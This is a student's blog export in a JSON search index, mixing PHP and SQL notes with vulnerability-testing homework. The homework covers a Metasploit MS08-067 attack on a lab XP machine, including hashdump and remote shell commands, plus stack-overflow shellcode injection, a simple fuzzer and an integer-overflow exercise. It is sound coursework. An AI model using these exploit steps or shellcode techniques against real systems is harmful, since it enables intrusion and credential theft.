if($num1==\"\") &#123;$error.=\"第一个数不能为空&lt;br&gt;\";&#125; elseif(!is_numeric($num1)) &#123;$error.=\"第一个数不是数字&lt;br&gt;\";&#125; if($num2==\"\") &#123;$error.=\"第二个数不能为空&lt;br&gt;\";&#125; elseif(!is_numeric($num2)) &#123;$error.=\"第二个数不时数字&lt;br&gt;\";&#125; if(($operator=='/' || $operator=='%')&amp;&amp; $num2==0) &#123;$error.=\"被除数不能为0&lt;br&gt;\";&#125; &#125;?&gt; &lt;body&gt; &lt;table align=\"center\" border =\"1\" width=\"500\"&gt; &lt;caption&gt;&lt;h1&gt;计算器&lt;/h1&gt;&lt;/caption&gt; &lt;form action=\"\" method=\"post\"&gt; &lt;tr&gt; &lt;td&gt; &lt;?php //将用户输入的数据计算后显示再输入表单中?&gt; &lt;input type=\"text\" size=\"5\" name=\"num1\" value=\"&lt;?php echo $num1;?&gt;\"&gt; &lt;/td&gt; &lt;td&gt; &lt;select name=\"operator\"&gt; &lt;option value=\"+\" &lt;?php if($operator==\"+\") echo \"selected\"?&gt;&gt;+ &lt;/option&gt; &lt;option value=\"-\" &lt;?php if($operator==\"-\") echo \"selected\"?&gt;&gt;- &lt;/option&gt; &lt;option value=\"*\" &lt;?php if($operator==\"*\") echo \"selected\"?&gt;&gt;* &lt;/option&gt; &lt;option value=\"/\" &lt;?php if($operator==\"/\") echo \"selected\"?&gt;&gt;/ &lt;/option&gt; &lt;option value=\"%\" &lt;?php if($operator==\"%\") echo \"selected\"?&gt;&gt;% &lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;td&gt; &lt;input type=\"text\" size=\"5\" name=\"num2\" value=\"&lt;?php echo $num2;?&gt;\"&gt; &lt;/td&gt; &lt;td&gt; &lt;input type=\"submit\" name=\"sub\" value=\"计算\"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;?php //使用单路分支，用户有提交操作才执行结果 if(isset($_POST[\"sub\"]))&#123; echo '&lt;tr&gt;&lt;td colspan=\"5\" align=\"center\"&gt;'; //双路分支，正确输入输出结果，有错误则输出错误信息 if(empty($error))&#123; $sum=0; switch($operator)&#123; case \"+\": $sum=$num1+$num2; break; case \"-\": $sum=$num1-$num2; break; case \"*\": $sum=$num1*$num2; break; case \"/\": $sum=$num1/$num2; break; case \"%\": $sum=$num1%$num2; break; &#125; echo \"结果：&#123;$num1&#125;&#123;$operator&#125;&#123;$num2&#125;=&#123;$sum&#125;&lt;br&gt;\"; &#125; else echo \"$error&lt;br&gt;\"; echo \"&lt;/td&gt;&lt;/tr&gt;\"; &#125; ?&gt; &lt;/form&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; &lt;html&gt; &lt;head&gt;&lt;title&gt;使用while循环嵌套输出表格&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;table align =\"center\" border=\"1\" width=600&gt; &lt;caption&gt;&lt;h1&gt;使用while循环嵌套输出表格&lt;/h1&gt;&lt;/caption&gt; &lt;?php $out = 0; while($out &lt; 10) &#123;//指定外层循环 $bgcolor = $out%2 ==0 ? \"#FFFFFF\" : \"#DDDDDD\"; echo \"&lt;tr bgcolor=\".$bgcolor.\"&gt;\"; $in=0; while($in&lt;10) &#123;//指定内层循环 echo \"&lt;td&gt;\".($out*10+$in).\"&lt;/td&gt;\"; $in++; &#125; echo \"&lt;/tr&gt;\"; $out++; &#125; ?&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; breakbreak 1; //退出一层 break 2;//退出两层 exit语句直接退出当前脚本 if.... exit; goto同C++ label: ..... goto label;","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"php","slug":"php","permalink":"https://gitee.com/michelle19l/michelle19l/tags/php/"}]},{"title":"sql语言","slug":"数据库/sql","date":"2020-05-21T13:03:31.000Z","updated":"2020-05-29T16:34:58.775Z","comments":true,"path":"2020/05/21/数据库/sql/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93/sql/","excerpt":"创建数据库 插入数据存储过程代码","text":"创建数据库 插入数据存储过程代码 创建表创建work1.sql文件 -- 创建表CREATE TABLE `innodb`( `id` int(11) NULL DEFAULT 0, `data` int(11) NULL DEFAULT 0) ENGINE=InnoDB;CREATE TABLE `myisam`( `id` int(11) NULL DEFAULT 0, `data` int(11) NULL DEFAULT 0) ENGINE=myisam;create procedure myinsert(a int) begin declare i int default 1; repeat insert into `innodb` VALUES(i,i); set i=i+1; until i&gt;a end repeat; end;-- 执行存储过程call myinsert(10000);-- 删除myinsert函数drop procedure if exists myinsert; 可以编写sql文件，也可在命令列界面中分步运行 运行之后需要刷新 针对数据库的操作-- 查看当前数据库show databases; -- 创建数据库CREATE DATABASE IF NOT EXISTS Management_SystemDEFAULT CHARACTER SET utf8mb4 DEFAULT COLLATE utf8mb4_unicode_ci;Use Flight_Management_System; -- 删除数据库DROP DATABASE [ IF EXISTS ] &lt;数据库名&gt;; 针对表的操作-- 向表中添加数据insert into `flight` values('CA123','TSN','TAO','CA');-- 清空表delete from [表名]; 视图create view search_tickets as select * from timetable natural join flight natural join airline drop view xxxx 查找当输出的属性不为主键时,可能出现重复 LIKE/NOT LIKE匹配% 代表任意字符串 _ 代表一个字符 SELECT nameFROM drinkersWHERE phone LIKE '555%'; -- 查找所有李姓员工SELECT *FROM employee WHERE empname LIKE '李%'; NULL空值任意字符串(%)与空值比较的结果是unknown,不会返回unknown结果值 true=1,false=0,unknown=1/2 -- 查找所有job非空的元组SELECT *FROM worksonWHERE job LIKE '%'; -- 或者为 job IS NOT NULL ORDER BY 输出排序ORDER BY &lt;list of attributes&gt;ASC(升序,默认),DESC(降序) SELECT enpnameFROM employeeWHERE deptno='d2'ORDER BY empno DESC; -- 可以按照不输出的属性排序 多表查询笛卡尔积-- 使用笛卡尔积连接两个表-- 两个表中有同名属性,select其中一个时需要标明,不然会出现两列SELECT beerFROM frequents,likes WHERE bar='Joe\"s Bar' AND frequents.drinker = likes.drinker; -- 待查找的内容为'-&gt;\" natural join只使用于两个表有一列相同属性 SELECT *FROM employee natrual join departmentWHERE location='天津';-- 相同的两列不重复出现-- 等价SELECT *FROM employee,departmentWHERE department.deptno=employee.deptno and location='天津';-- 使用and/or连接多个查询条件 inner join作用与natural相同，使用与有多个相同属性，使用on进行约束 left/right outer join 左/右外连接(显示count=0的部分-&gt;单元内容为null) -- 给出每个专业借阅的“c2”类的图书总数，没有借阅的次数显示为0（select majorid,majorname,count(catid) as borrowcountfrom student left outer join borrow on student.stuid=borrow.stuidleft outer join book on book.bookid=borrow.bookidand book.catid='c2'natural join majorgroup by majorid; 元组变量引入一个关系的两个或更多部分 -- 返回制造商一致的啤酒对SELECT b1.name,b2.nameFROM beers b1,beers b2WHERE b1.manf=b2.manf and b1.name&lt;b2.name; -- 避免冗余 子查询嵌套-- find bars that serve Miller at the same price Joe charges for BudSELECT barFROM sellsWHERE beer='Miller' and price= (SELECT price FROM sells WHERE bar='Joe\"s Bar' and beer='Bud'); IN/NOT IN操作只能用于连接查询结果,而不能是 in+&lt;表&gt; SELECT *FROM BeersWHERE name IN (SELECT beer FROM likes WHERE drinker='Fred'); -- 当子查询只有一个查询结果,in可改为=-- 或写成SELECT name,manfFROM Beers,LikesWHERE drinker='Fred' and beer=name; EXISTS当且仅当关系非空时为真 -- 不存在制造商一致的不同啤酒-&gt; 一个manf只有一个beer的beerSELECT nameFROM beers b1WHERE NOT EXISTS (SELECT * FROM beers WHERE manf = b1.manf and name &lt;&gt; b1.name); -- 查找部门中只有一名员工的员工姓名SELECT empnameFROM empoyee e1WHERE not exists (SELECT * FROM employee WHERE deptno=e1.deptno and empname&lt;&gt;e1.empname); ANY/ALLx=ANY (relation) 等于其中至少一个x&gt;ANY (relation) 大于至少一个relation中只有一个属性列X&lt;&gt;ALL (relation) x不在relation内x&gt;ALL (relation) x大于等于关系中的所有元组 -- 找到售价最高的，注意是&gt;=SELECT beerFROM sellsWHERE price&gt;=ALL(SELECT price FROM sells); -- 不是最低价格SELECT beerFROM sellsWHERE price&gt;ANY(SELECT price FROM sells); 子表命名-- 给出借阅了所有图书类别的本科生select stuid,stunamefrom(select stuid,count(distinct catid) as timesfrom borrow natural join student natural join bookwhere student.degree='本科生'group by stuid) as temp1 natural join studentwhere times=(select count(*) from category);-- -----------------select stuid, stuname from student where degree = '本科生' and not exists( select catid from category where catid not in( select catid from book, borrow where book.bookid = borrow.bookid and borrow.stuid = student.stuid ); Union, Intersecion, Differenceintersect：交集union：并集except：A-B -- 两个集合的交集,要求两个表具有相同的属性列(SELECT * FROM likes) -- likes(drinker,beer) INTERSECT(SELECT drinker,beerFROM sells,frequentsWHERE frequents.bar=sells.bar); Set(集合)/Bag(包)普通的select-from-where是包-&gt;可重复union\\intersection\\difference是集合-&gt;不可重复 SELECT DISTINCT price -- 强制转化为不可重复FROM sells; (...) UNION ALL (...); -- 可重复 -- eg. empname有七条SELECT e1.empnameFROM empname e1,empname e2; -- 返回49条SELECT DISTINCT e1.empnameFROM empname e1,empname e2; -- 返回7条 Aggregations聚合操作sum、avg、min、max、count、count(*) 聚合不可以嵌套使用 AVGSELECT AVG(price)FROM sells; COUNTcount忽略null，计算重复count(*)不忽略null SELECT COUNT(DISTINCT price) -- 有多少种不同的售价FROM sellsWHERE beer='Bud'; GROUP BY分组运算在积运算和投影运算之后进行 SELECT beer,AVG(price)FROM sellsGROUP BY beer; -- 获得每种啤酒的平均价格 -- 每个员工做几个项目SELECT empno,count(*)FROM worksonGROUP BY empno; -- 每个项目由几名员工完成SELECT projectno,count(*)FROM worksonGROUP BY projectno; NULL单独作为一个分组 -- 1998.04.15后入职员工所参与项目的平均预算SELECT empno,avg(budget)FROM workson,projectWHERE workson.projectno=project.projectno and date&gt;'1998-04-15'GROUP BY empno; MINSELECT min(budget)FROM project; -- 查找bud的最低价格,不能得到正确结果SELECT bar,min(price)FROM sellsWHERE beer='Bud';-- 应该写为SELECT barFROM sellsWHERE beer='Bud' and price&lt;=ALL(SELECT price FROM sells WHERE beer='Bud'); HavingSELECT beer,AVG(price)FROM sellsGROUP BY beer -- having 添加group条件，至少在三家酒吧售卖或由B公司制造HAVING COUNT(*)&gt;=3 OR --针对group by中的属性 beer IN (SELECT name -- 只有group by中的属性，才能以非聚合形式出现在having中 FROM beers WHERE manf='Busch');","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"sql","slug":"sql","permalink":"https://gitee.com/michelle19l/michelle19l/tags/sql/"}]},{"title":"漏洞测试作业八：攻破XP","slug":"漏测作业/漏测作业八","date":"2020-05-21T04:36:09.000Z","updated":"2020-06-12T04:06:53.752Z","comments":true,"path":"2020/05/21/漏测作业/漏测作业八/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/21/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AB/","excerpt":"","text":"kali linuxnessusmetasploitms08_067利用 题目在KALI中安装NESSUS，对目标XP SP3主机进行扫描；根据扫描得到的漏洞结果利用metasploit框架（命令行模式）完成利用，对XP主机（关闭系统的安全防护措施）实施渗透攻击： （1）熟练掌握metasploit中的常见指令 （2）攻击效果应该能获取XP主机的屏幕截图（屏幕截图个性化，比如用记事本打开输入个人学号等信息），并将截图作为实验报告的一部分提交 （3）Armitage工具的渗透过程可以基于命令行的操作基础上自己实践 解答(0) Nessus安装软件安装在https://www.tenable.com/downloads/nessus下载对应安装包，本人使用的是61为kali linux，下载的是 # 解压安装包sudo dpkg -i Nessus-8.10.0-debian6_amd64.deb# 启动服务/etc/init.d/nessusd start# 查看服务sudo netstat -ntpl | grep nessus 表示安装成功 配置在浏览器中输入https://localhost:8834/,点击```Advanced```,根据提示输入激活码,设置账户root,密码123456 使用浏览器更新插件易出现卡死情况,这时候需要用命令行手动更新 sudo /opt/nessus/sbin/nessuscli update --plugins-only 重启服务 sudo /etc/init.d/nessusd restart 安装成功 (1) metasploit常见指令 指令 解释 back 跳出当前模块 show exploits 显示metasploit框架中所有课用的渗透攻击模块 主动型exploits能够直接连接并攻击特定主机 被动性exploits等待主机连接之后对其进行渗透攻击 show auxiliary 显示所有的辅助模块以及它们的用途Metasploit中，辅助模块可以是扫描器、拒绝服务攻击工具、Fuzz测试器以及其它类型的工具 show options 参数options是保证框架哥哥模块正确运行所需要的各种设置，这个命令会列出所需参数 show payloads 攻击载荷是针对特定平台的一段攻击代码，他将通过网络传送到攻击目标进行执行 use 找到攻击模块或者payloads后，可以使用use命令加载模块 show targets 列出受到漏洞影响的目标系统的类型 info info+模块名 给出此模块的详细信心、参数说明以及所有课用的目标操作系统 check 检测目标主机是否存在指定漏洞 set 针对某个参数进行设置（同时启动该参数） unset 禁用相关参数 (2) 扫描目标XP SP3主机查看xp的ip地址 得到ip地址: 192.168.89.141 使用nessus扫描new scan -&gt; advanced scan 点击save启动扫描 下面利用漏洞ms08_067 使用metasploit==xp关闭防火墙并打开445端口==telnet 192.168.89.141 445 445端口打开 445端口关闭 （本系统的445端口默认关闭） 防火墙和自动更新已关闭 打开metasploit 查看对应漏洞相关攻击模块search ms08_067 选定要进行渗透的攻击模块use exploit/windows/smb/ms08_067_netapi 查看模块有关选项show options 设定攻击目标set RHOST 192.168.89.141 开始攻击exploit 攻击成功 利用漏洞对目标主机进行控制show payloads 使用正向连接shellset payload windows&#x2F;meterpreter&#x2F;bind_tcp show options查看该攻击载荷有无其它要求 设置系统版本号XP sp3 中文简体办-&gt;34 set target 34 攻击exploit 攻击成功 得到用户信息hashdump 获取目标主机的控制权shell 浏览目标主机目录 退回meterpreter 屏幕快照screenshot","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"kali linux","slug":"kali-linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/kali-linux/"},{"name":"nessus","slug":"nessus","permalink":"https://gitee.com/michelle19l/michelle19l/tags/nessus/"},{"name":"metasploit","slug":"metasploit","permalink":"https://gitee.com/michelle19l/michelle19l/tags/metasploit/"},{"name":"ms08_067","slug":"ms08-067","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ms08-067/"}]},{"title":"虚拟机复制后无法连网","slug":"虚拟机复制后无法连网","date":"2020-05-20T13:03:31.000Z","updated":"2020-05-21T08:25:01.113Z","comments":true,"path":"2020/05/20/虚拟机复制后无法连网/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/20/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%8D%E5%88%B6%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E7%BD%91/","excerpt":"","text":"虚拟机设置-&gt;移除网络适配器-&gt;添加网络适配器","categories":[{"name":"vmware","slug":"vmware","permalink":"https://gitee.com/michelle19l/michelle19l/categories/vmware/"}],"tags":[{"name":"虚拟机","slug":"虚拟机","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"kali linux","slug":"kali-linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/kali-linux/"}]},{"title":"Kali 基础命令","slug":"KaliLinux指令","date":"2020-05-19T08:53:00.000Z","updated":"2020-05-19T09:01:13.629Z","comments":true,"path":"2020/05/19/KaliLinux指令/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/19/KaliLinux%E6%8C%87%E4%BB%A4/","excerpt":"","text":"Kali 基础命令 ls 显示文件或目录 mkdir 创建目录 cd 切换目录 touch 创建空目录 cat 查看空文件 cp 拷贝 mv 移动或重命名 find 在文件系统中搜索某文件 stat 显示指定文件的详细信息比ls更详细 who 显示在线登录用户 whoami 显示当前操作用户 hostname 显示主机名 unanme 显示系统信息 top 动态显示当前耗费资源最多进程信息 ps 显示瞬间进程状态ps -aux du 查看目录大小 du -h /home带有单位显示目录信息 df 查看磁盘大小df -h带有单位显示磁盘信息 ifconfig 查看网络情况 ping 测试网络连通 netstat 显示网络状态信息 man 查看命令使用方法,如man ls clear 清屏 kill 杀死进程,可以先用ps或top命令查看进程的id,然后再用kill命令杀死进程","categories":[{"name":"信安","slug":"信安","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E4%BF%A1%E5%AE%89/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Kali-Linux/"}]},{"title":"漏洞测试作业七：漏洞挖掘示例","slug":"漏测作业/漏测作业七","date":"2020-05-15T15:36:09.000Z","updated":"2020-06-12T04:06:19.741Z","comments":true,"path":"2020/05/15/漏测作业/漏测作业七/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%83/","excerpt":"","text":"模糊测试和Fuzzer编写 在CP VC6生成课本示例6-1的案例（RELEASE模式）注意修改char des[5]为char des[20]: //课本示例6-1# include &lt;stdio.h&gt;# include &lt;string.h&gt;void makeoverflow(char* b)&#123; char des[20]; strcpy(des,b);&#125;void main(int argc,char* argv[])&#123; if(argc&gt;1) &#123; if(strstr(argv[1],\"overflow\")!=0)// strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。 makeoverflow(argv[2]); // 在cmd中运行，arg[0]为可执行文件名 &#125; else printf(\"usage:findoverflow XXXX\\n\");&#125; 生成程序的Release版本 (1)通过IDA此法分析的手段来实现漏洞挖掘1. 使用逆向分析工具IDA，得到反汇编后的执行代码1) 利用IDA打开所生成的EXE文件，view-&gt;subviews-&gt;proximity browser 通过该视图，可见主要有一个main函数，在该函数中可能有跳转，调用sub_401000函数、_strstr函数和printf函数，此外还定义了两个字符串常量aUsageFindoverf、aOverflow 2) 右键点击aUsageFindoverflow-&gt;text view，可以看到如下代码 3) 右键点击_main-&gt;graph view,查看main函数的汇编代码块 2. 定位敏感函数，也就是容易出现溢出的函数 ==arg_x表示函数参数x的位置，var_8表示局部变量的位置====[]是内存寻址，[x+arg_x]表示arg_x的值== ==realease版本简洁、执行效率先====debug版本严格按照语法结构，增加了很多方便调试的附加信息== 在主函数中，printf函数可能与==字符串格式化漏洞==有关，但通过分析主函数的汇编代码，可以看出该函数并无任何格式化参数存在 有格式化字符串的printf函数： 敏感函数可能存在于sub_401000函数中 ==为什么var_14是14？，和char des[20]是否有关？？？== sub40100函数的代码大致结构如下 sub_40100(arg_0)&#123; char var_14[14]; strcpy(var_14,arg_0);&#125; 3. 判断是否存在溢出// 为方便观察，在程序中加入标志性符号//课本示例6-1# include &lt;stdio.h&gt;# include &lt;string.h&gt;void makeoverflow(char* b)&#123; char des[20]; strcpy(des,b); printf(des);&#125;void main(int argc,char* argv[])&#123; if(argc&gt;1) &#123; printf(\"%d\\n\",argc); printf(argv[0]); printf(\"\\n\"); printf(argv[1]); printf(\"\\n\"); printf(argv[2]); printf(\"\\n\\n\"); if(strstr(argv[1],\"overflow\")!=0)// strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。 makeoverflow(argv[2]); &#125; else printf(\"usage:findoverflow XXXX\\n\");&#125; 测试程序： ==存在溢出问题== (2)尝试自己写一个Fuzzer程序，实现对此程序的漏洞挖掘，可以在输入构造的时候以overflow为基本输入1. 样例程序学习1) memset和memcpy 2) 样例Fuzzer程序#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(int argc,char *argv[])&#123; char * testbuf=\"\"; char buf[1024]; memset(buf,0,1024); if(argc&gt;2) for(int i=20;i&lt;50;i+=2) &#123; testbuf=new char[i]; memset(testbuf,0,i); memset(testbuf,'c',i); memcpy(buf,testbuf,i); // printf(\"%s\\n\",buf); ShellExecute(NULL,\"open\",argv[1],buf,NULL,SW_NORMAL); delete testbuf; &#125; else printf(\"Fuzzing X 1\\n其中X为被测试目标程序所在路径，1 表示开始循环递增暴力测试\\n\"); system(\"pause\");&#125; 2. Fuzzer程序需求分析 需要提供被测目标程序所在路径 argv[1]=”findoverflow “+待生成字符串 #include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(int argc,char *argv[])&#123; char * testbuf=\"\"; char buf[1024]; memset(buf,0,1024); char a[]=\"findoverflow \"; for(int i=20;i&lt;50;i+=2) &#123; testbuf=new char[i]; memset(testbuf,0,i); memset(testbuf,'c',i); memcpy(buf,a,13); for(int j=0;j&lt;=i+13;j++) buf[j+13]=testbuf[j]; buf[i+13]=0; printf(\"%s\\n\",buf); delete testbuf; &#125; system(\"pause\");&#125; 3. Fuzzer程序#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;void main(int argc,char *argv[])&#123; char * testbuf=\"\"; char buf[1024]; memset(buf,0,1024); char a[]=\"findoverflow \"; if(argc&gt;2) for(int i=20;i&lt;50;i+=2) &#123; testbuf=new char[i]; memset(testbuf,0,i); memset(testbuf,'c',i); memcpy(buf,a,13); for(int j=0;j&lt;=i+13;j++) buf[j+13]=testbuf[j]; buf[i+13]=0; //printf(\"%s\\n\",buf); ShellExecute(NULL,\"open\",argv[1],buf,NULL,SW_NORMAL); delete testbuf; &#125; else printf(\"Fuzzing X 1\\n其中X为被测试目标程序所在路径，1 表示开始循环递增暴力测试\\n\"); system(\"pause\");&#125;","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"模糊测试","slug":"模糊测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"Fuzzer","slug":"Fuzzer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Fuzzer/"}]},{"title":"漏洞测试作业六：SHELLCODE编写实例","slug":"漏测作业/漏测作业六","date":"2020-05-15T10:36:09.000Z","updated":"2020-06-12T04:05:39.436Z","comments":true,"path":"2020/05/15/漏测作业/漏测作业六/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%85%AD/","excerpt":"","text":"Shellcode编写 题目请在XP VC6生成课本示例5-1的案例（DEBUG模式），通过修改reg.txt文件，址入shellcode。Shellcode的内容与课本一致。撰写实验报告。 解答程序#include &lt;iostream&gt;#include &lt;windows.h&gt;#define REGCODE \"12345678\"int verify(char* code)&#123; int flag; char buffer[44]; flag=strcmp(REGCODE,code); # 若str1=str2，则返回零 strcpy(buffer,code); return flag;&#125;void main()&#123; int vFlag=0; char regcode[1024]; FILE * fp; LoadLibrary(\"user32.dll\"); if(!(fp=fopen(\"reg.txt\",\"rw+\"))) exit(0); fscanf(fp,\"%s\",regcode); vFlag=verify(regcode); if(vFlag) printf(\"wrong regcode!\\n\"); else printf(\"passed!\\n\"); fclose(fp); system(\"pause\");&#125; 一、程序正常运行 regcode=&quot;12341234&quot; regcode=&quot;12345678&quot; 二、弹出”passed!” 思路当vFlag!=1时程序跳转到passed,所以需要使vFlag==0。函数Verify的栈帧中，buffer对应44个字节，所以只需要利用UltraEdit在reg.txt中写入48位数据且后四位全部为0即可覆盖Flag，改变函数verify的返回值，从而改变vFlag的值。 修改reg.txt1. flag==-1 失败 2.flag==1 成功 解释读入字符串时默认遇到0就停下，末尾只能读入一个0，所以需要利用大端存储将flag的后三个字节全部置零，即使flag=1，即REGCODE大于code。 三、弹出MessageBox1.思路#### 2.MessageBox函数解析&#96;&#96;&#96;Cint MessageBox( HWND hWnd, &#x2F;&#x2F;handle to owner window 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口 LPCTSTR lpText, &#x2F;&#x2F;text in message box 字符串指针，所指字符串会在消息框中显示 LPCTSTR lpCaption, &#x2F;&#x2F;message box title 字符串指针，所指字符串将成为消息框的标题 UNIT uType &#x2F;&#x2F;message box style 消息框的风格（单按钮、多按钮等），NULL代表默认风格) 3. 查看弹出MessageBox所对应的汇编代码#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void main()&#123; MessageBox(NULL,NULL,NULL,0); return;&#125; ==*注：不建议使用PUSH 0，因此采用xor ebx,ebx push ebx代替== 4. 找到MessageBox函数入口地址a）调用函数，查看指令地址地址：77D507EA b）利用Dependency工具查看地址 随便拖入一个PE文件，就可以看到它所使用的库文件了，在左侧列中选出USER32.DLL，MessageBox显示字符类型为A类（ASCII），因此在汇编语言中调用的应该是MessageBoxA 所以函数地址为&#96;&#96;&#96;0x77D10000+0x000407EA&#x3D;0x77D504EA c）编写指令代码#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void main()&#123; LoadLibrary(&quot;user32.dll&quot;); _asm &#123; xor ebx,ebx&#x2F;&#x2F;使用寄存器代替0 push ebx push ebx push ebx push ebx mov eax,77d507eah&#x2F;&#x2F;函数入口地址77d507ea call eax &#125; return;&#125; 嵌入字符串“westwest”，对应16进制w:77,e:65,s:73,t:74,大端存储改为push 74736577 #include &lt;stdio.h&gt;#include &lt;windows.h&gt;void main()&#123; LoadLibrary(&quot;user32.dll&quot;); _asm &#123; xor ebx,ebx push ebx&#x2F;&#x2F;使用寄存器代替0 push 74736577h&#x2F;&#x2F;注意标明16进制 push 74736577h mov eax,esp&#x2F;&#x2F;栈顶即指向字符串的指针 push ebx push eax push eax push ebx mov eax,77d507eah&#x2F;&#x2F;函数入口地址77d507ea call eax &#125; return;&#125; 弹出窗口，测试成功 得到机器代码33 DB 53 68 77 65 73 74 68 77 65 73 74 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0 d）编写Shellcode代码用记事本将空格替换为’\\x’ #include &lt;stdio.h&gt;#include &lt;windows.h&gt;char ourshellcode[]&#x3D;&quot;\\x33\\xDB\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x77\\x65\\x73\\x74\\x8B\\xC4\\x53\\x50\\x50\\x53\\xB8\\xEA\\x07\\xD5\\x77\\xFF\\xD0&quot;;void main()&#123; LoadLibrary(&quot;user32.dll&quot;); int * ret; ret&#x3D;(int*)&amp;ret+2; (*ret)&#x3D;(int)ourshellcode; return;&#125; 将EIP内容替换为shellcode内容，执行shellcode代码 测试成功 将shellcode写入reg.txtbuffer地址 弹出对话框，实验成功","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"Shellcode编写","slug":"Shellcode编写","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Shellcode%E7%BC%96%E5%86%99/"}]},{"title":"漏洞测试作业五：整数溢出漏洞","slug":"漏测作业/漏测作业五","date":"2020-05-15T08:53:03.000Z","updated":"2020-06-12T04:04:54.958Z","comments":true,"path":"2020/05/15/漏测作业/漏测作业五/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%94/","excerpt":"","text":"整数溢出漏洞 题目请在XP VC6生成课本示例4-2的案例（DEBUG模式）。进而，修改input.txt文件，使得程序运行时弹出计算器。提示：input.txt在利用IDE调试时需要放到cpp文件相对目录下；单独运行exe的时候，需要放到exe所在目录中 解答课本示例#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;shellapi.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_INFO 32767using namespace std;void func()&#123; ShellExecute(NULL,\"open\",\"notepad\",NULL,NULL,SW_SHOW);&#125;void func1()&#123; ShellExecute(NULL,\"open\",\"calc\",NULL,NULL,SW_SHOW);&#125;int main()&#123; void (*fuc_ptr)()=func; char info[MAX_INFO]; char info1[30000]; char info2[30000]; freopen(\"inputtxt\",\"r\",stdin); cin.getline(info1,30000,' '); cin.getline(info2,30000,' '); short len1=strlen(info1); short len2=strlen(info2); short all_len=len1+len2; if(all_len&lt;MAX_INFO) &#123; strcpy(info,info1); strcat(info,info2); &#125; fuc_ptr(); return 0;&#125; 思路当len1和len2均较大时,short all_len = len1 + len2; 